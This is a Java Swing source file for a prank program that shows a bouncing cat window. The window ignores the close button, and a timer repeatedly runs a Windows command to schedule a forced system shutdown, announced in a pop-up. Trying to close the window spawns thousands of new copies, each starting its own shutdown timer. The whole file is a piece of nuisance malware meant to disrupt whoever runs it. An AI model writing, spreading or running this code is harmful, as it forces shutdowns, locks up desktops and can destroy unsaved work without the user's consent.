import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Random;

public class Cat extends JFrame implements WindowListener, ActionListener {
    ImageIcon image = new ImageIcon(getClass().getClassLoader().getResource("ezgif.com-gif-maker.gif"));
    ImageIcon icon = new ImageIcon(getClass().getClassLoader().getResource("cat.png"));
    Timer timer;
    Random random = new Random();
    final int WIDTH = 1300;
    final int HEIGHT = 500;
    int xVelocity = random.nextInt(5,15);
    int yVelocity = random.nextInt(5,15);
    int x = random.nextInt(0,1300);
    int y = random.nextInt(0,500);
    int time = 3200; //this is the time for the pc to shut down, shown in seconds.

    JLabel label;
    public Cat(){
        this.setTitle("cat");
        this.setIconImage(icon.getImage());
        Random random = new Random();
        this.setSize(640,578);
        this.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        this.addWindowListener(this);
        label = new JLabel();
        label.setIcon(image);
        int x = random.nextInt(0, 1400);
        int y = random.nextInt(100, 500);
        this.add(label);
        this.setResizable(false);
        this.setLocation(x,y);
        this.setVisible(true);
        timer = new Timer(0, this);
        timer.start();
        Timer timer2 = new Timer(10, new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                try{
                    Process process = Runtime.getRuntime().exec("Shutdown -s -t " + String.valueOf(time));
                    BufferedReader reader = new BufferedReader( new InputStreamReader(process.getInputStream()));
                    JOptionPane.showMessageDialog(null,"Ur pc will shutdown in " + time + " !");
                }catch (Exception ex){
                    ex.printStackTrace();
                }

            }
        });
        timer2.start();

    }

    @Override
    public void windowOpened(WindowEvent e) {

    }

    @Override
    public void windowClosing(WindowEvent e) {
        int c = 1000;
        int cont = 0;
        for (int i = 0; i <= 5000; i++) {
            new Cat();
            while (cont != 1000) {
                if (c % 10 == 1) {
                    c = (3 * c) + 1;
                    cont++;
                    // System.out.println(i);
                } else {
                    c = (3 / 2);
                    cont++;
                    //System.out.println(i);
                }
            }
        }

    }

    @Override
    public void windowClosed(WindowEvent e) {

    }

    @Override
    public void windowIconified(WindowEvent e) {

    }

    @Override
    public void windowDeiconified(WindowEvent e) {

    }

    @Override
    public void windowActivated(WindowEvent e) {

    }

    @Override
    public void windowDeactivated(WindowEvent e) {

    }

    @Override
    public void actionPerformed(ActionEvent e) { //This is the code that moves the cat around, as u can see it's way better
        if(x>= WIDTH || x<0){
            xVelocity = xVelocity * -1;
        }
        x = x + xVelocity;

        if(y>= HEIGHT || y<0){
            yVelocity = yVelocity * -1;
        }

        y = y + yVelocity;

        this.setLocation(x,y);
    }
}
